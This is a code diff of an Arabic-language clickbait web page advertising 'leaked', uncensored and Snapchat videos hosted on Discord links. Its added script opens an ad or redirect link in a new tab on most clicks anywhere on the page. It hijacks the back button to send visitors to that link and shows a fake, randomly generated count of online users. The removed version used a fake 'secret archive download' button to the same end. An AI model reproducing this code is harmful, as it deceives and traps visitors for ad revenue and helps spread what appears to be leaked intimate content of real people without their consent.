@@ -3,164 +3,272 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>المحتوى الحصري | منصة المشاهدة المباشرة</title>
+    <title>حصريات العرب | الأرشيف الكامل</title>
     
     <meta content="summary_large_image" name="twitter:card"></meta>
     <meta content="@AlianAlion" name="twitter:site"></meta>
     <meta content="*" name="twitter:title"></meta>
-    <meta content="وصف مختصر للمحتوى" name="twitter:description"></meta>
+    <meta content="مشاهدة حصرية - حصريات العرب" name="twitter:description"></meta>
     <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg" name="twitter:image"></meta>
 
     <style>
+        :root {
+            --primary-color: #ff0000;
+            --accent-color: #ffcc00;
+            --bg-dark: #0a0a0a;
+            --card-bg: #161616;
+        }
+
         body {
-            background-color: #000;
+            background-color: var(--bg-dark);
             color: #fff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             padding: 0;
-            text-align: center;
-            overflow-x: hidden;
         }
-        .main-container {
-            max-width: 650px;
-            margin: auto;
+
+        /* الهيدر الاحترافي */
+        header {
+            background: linear-gradient(to bottom, #1a1a1a, transparent);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #222;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: 900;
+            color: var(--primary-color);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+            margin: 0;
+        }
+
+        .sub-logo {
+            color: var(--accent-color);
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 20px auto;
             padding: 10px;
         }
-        /* تصميم مشغل يوتيوب (العرضي) */
-        .hero-video {
-            background: #000;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid #333;
-            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.2);
-            margin-bottom: 15px;
-            position: relative;
-            /* نسبة 16:9 للحفاظ على شكل يوتيوب */
-            aspect-ratio: 16 / 9; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        video {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain; /* هذا يضمن بقاء السواد على الجوانب للمقاطع الطولية */
-            background: #000;
-        }
-        .promo-box {
-            background: linear-gradient(145deg, #121212, #000);
-            padding: 15px;
+
+        /* تصميم كرت الفيلم */
+        .video-card {
+            background: var(--card-bg);
             border-radius: 15px;
+            margin-bottom: 30px;
+            overflow: hidden;
             border: 1px solid #222;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transition: transform 0.3s;
         }
-        .call-to-action {
-            color: #fff;
-            font-size: 1.2rem;
-            font-weight: bold;
-            line-height: 1.5;
-            margin-bottom: 12px;
+
+        .video-card:active {
+            transform: scale(0.98);
         }
-        .highlight-text {
-            color: #ffcc00; /* ذهبي جذاب للخليجيين */
-            display: block;
-            font-size: 1.4rem;
-            margin-bottom: 5px;
-        }
-        .download-btn {
-            background: linear-gradient(90deg, #e60000, #800000);
-            color: white;
-            text-decoration: none;
-            padding: 16px;
-            display: block;
-            border-radius: 50px; /* شكل أكثر عصرية */
-            font-weight: 800;
-            font-size: 1.3rem;
-            border: 1px solid rgba(255,255,255,0.3);
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.6); }
-            70% { transform: scale(1.02); box-shadow: 0 0 0 15px rgba(255, 0, 0, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
-        }
-        .features-list {
-            margin-top: 15px;
-            color: #888;
-            font-size: 0.85rem;
+
+        .video-header {
+            padding: 12px 15px;
             text-align: right;
-            display: inline-block;
+            border-bottom: 1px solid #222;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        .features-list li { margin-bottom: 6px; }
-        .view-count {
+
+        .video-title {
+            font-weight: bold;
+            font-size: 1rem;
+            color: #eee;
+        }
+
+        .quality-badge {
+            background: var(--primary-color);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            background: #000;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        /* زر التحميل أسفل كل مقطع */
+        .card-action {
+            padding: 15px;
+            background: #111;
+        }
+
+        .watch-btn {
+            background: linear-gradient(90deg, #333, #000);
+            color: var(--accent-color);
+            text-decoration: none;
+            display: block;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid var(--accent-color);
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .footer {
+            padding: 40px 20px;
+            text-align: center;
             color: #555;
-            font-size: 0.75rem;
-            margin: 10px 0;
-            border-top: 1px solid #222;
-            padding-top: 10px;
+            font-size: 0.8rem;
+        }
+
+        .live-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #ff0000;
+            border-radius: 50%;
+            margin-left: 5px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; }
         }
     </style>
 </head>
-<body onclick="handleGlobalClick()">
+<body onclick="earnMoney()">
 
-<div class="main-container">
-    <h2 style="color: #fff; font-size: 1.1rem; margin-bottom: 15px;">🎥 تم تجهيز المقطع.. <span style="color:#ff0000">مشاهدة مباشرة</span></h2>
+<header>
+    <h1 class="logo">حصريات العرب</h1>
+    <div class="sub-logo">سيرفرات المشاهدة المباشرة (VIP)</div>
+</header>
+
+<div class="container">
     
-    <div class="hero-video">
-        <video id="discordPlayer" controls playsinline autoplay muted loop poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg">
-            <source src="https://media.discordapp.net/attachments/1134630020162269298/1472393401725878475/VID_20260213_161650.mp4?ex=699268b6&is=69911736&hm=e68b512f98d6bc1b33f8da93f7b0db90a65907a430cd072644f126dd96bf1e12&" type="video/mp4">
-        </video>
-    </div>
-
-    <div class="promo-box">
-        <div class="call-to-action">
-            <span class="highlight-text">⚠️ المقطع "المحذوف" بالكامل ⚠️</span>
-            المقطع اللي تدوّر عليه موجود هنا وبدقة <span style="color:#ffcc00">4K</span>.. ادخل قبل ما يتم الحذف مجدداً!
+    <div class="video-card">
+        <div class="video-header">
+            <span class="video-title">🔥 التسريب الأول - كامل وبدون حذف</span>
+            <span class="quality-badge">4K ULTRA HD</span>
         </div>
-        
-        <a href="https://playloadwsrn.com/2005399927978864642" class="download-btn">
-            ⚡ دخول الأرشيف السري (تحميل) ⚡
-        </a>
-
-        <div class="view-count">
-            👁️ يشاهد الآن: <span id="visits">...</span> شخص من السعودية
+        <div class="video-wrapper">
+            <video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg">
+                <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885274047418401/VID_20260216_111844.mp4?ex=699432ce&is=6992e14e&hm=58af755808107ddd378d7532a9c0641aab818b1d9017d7f3f46aec15e2f0e673&" type="video/mp4">
+            </video>
         </div>
-
-        <div class="features-list">
-            <ul>
-                <li>🔥 تسريبات حصرية (VIP) لا توجد في تويتر.</li>
-                <li>🔞 الأجزاء المحذوفة كاملة بدون تغبيش.</li>
-                <li>🚫 سرية تامة.. لا يظهر في سجل المتصفح.</li>
-                <li>💎 سيرفرات سريعة جداً لأهل الخليج.</li>
-            </ul>
+        <div class="card-action">
+            <div class="watch-btn">🌐 جاري الاتصال بالسيرفر 1...</div>
         </div>
     </div>
+
+    <div class="video-card">
+        <div class="video-header">
+            <span class="video-title">📸 المقطع الثاني - لقطات حصرية</span>
+            <span class="quality-badge">FULL HD</span>
+        </div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4">
+            </video>
+        </div>
+        <div class="card-action">
+            <div class="watch-btn">🌐 جاري الاتصال بالسيرفر 2...</div>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-header">
+            <span class="video-title">🎥 الأرشيف السري - الجزء الثالث</span>
+            <span class="quality-badge">HD</span>
+        </div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886067396083813/VID_20260216_112311.mp4?ex=6994338b&is=6992e20b&hm=b2a0cf7a1a4262d3b81b06c7b813d23d1c48d3b60ead6e455a047635523e8661&" type="video/mp4">
+            </video>
+        </div>
+        <div class="card-action">
+            <div class="watch-btn">🌐 جاري الاتصال بالسيرفر 3...</div>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-header">
+            <span class="video-title">🔞 تسريب سناب شات - خاص</span>
+            <span class="quality-badge">4K</span>
+        </div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886226938888243/VID_20260216_112348.mp4?ex=699433b1&is=6992e231&hm=cdfe278624b14a7c82d589be3b5952223b242cb004c7c77eb864e2319052809d&" type="video/mp4">
+            </video>
+        </div>
+        <div class="card-action">
+            <div class="watch-btn">🌐 جاري الاتصال بالسيرفر 4...</div>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-header">
+            <span class="video-title">📂 ختام الأرشيف - المقطع النادر</span>
+            <span class="quality-badge">BLUE RAY</span>
+        </div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886235159597078/VID_20260216_112356.mp4?ex=699433b3&is=6992e233&hm=4b674d13a6277c44a936f98f6f231ca50f825ebab4fe8e64c18b4d230c5fcd4b&" type="video/mp4">
+            </video>
+        </div>
+        <div class="card-action">
+            <div class="watch-btn">🌐 جاري الاتصال بالسيرفر 5...</div>
+        </div>
+    </div>
+
+</div>
+
+<div class="footer">
+    <div style="margin-bottom: 10px;">
+        <span class="live-indicator"></span> متصل الآن: <span id="online-count">4,281</span> عضو
+    </div>
+    &copy; 2026 حصريات العرب - جميع الحقوق محفوظة
 </div>
 
 <script>
-    // نظام العداد
-    function cb(response) {
-        document.getElementById('visits').innerText = response.value;
-    }
-</script>
-<script async src="https://api.countapi.xyz/hit/alian_project_unique_id/visits?callback=cb"></script>
+    // رابط الأرباح (Direct Link)
+    const adsLink = "https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5";
+    let clickCount = 0;
 
-<script>
-    const cashLink = "https://playloadwsrn.com/2005399927978864642";
-    let clickCounter = 0;
-
-    function handleGlobalClick() {
-        clickCounter++;
-        if (clickCounter === 1 || (clickCounter - 1) % 3 === 0) {
-            window.open(cashLink, '_blank');
+    // وظيفة الربح عند كل نقرة
+    function earnMoney() {
+        clickCount++;
+        
+        // النقرة الأولى يفتح إعلان، ثم كل نقرتين يفتح إعلان جديد
+        if (clickCount === 1 || clickCount % 2 === 0) {
+            window.open(adsLink, '_blank');
         }
     }
 
+    // مانع الخروج الذكي
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
         window.onpopstate = function() {
-            window.location.replace(cashLink);
+            window.location.replace(adsLink);
         };
     })();
+
+    // تزييف عدد المتصلين لزيادة الحماس
+    setInterval(() => {
+        const count = Math.floor(Math.random() * (5000 - 4000) + 4000);
+        document.getElementById('online-count').innerText = count.toLocaleString();
+    }, 3000);
 </script>
 
 </body>
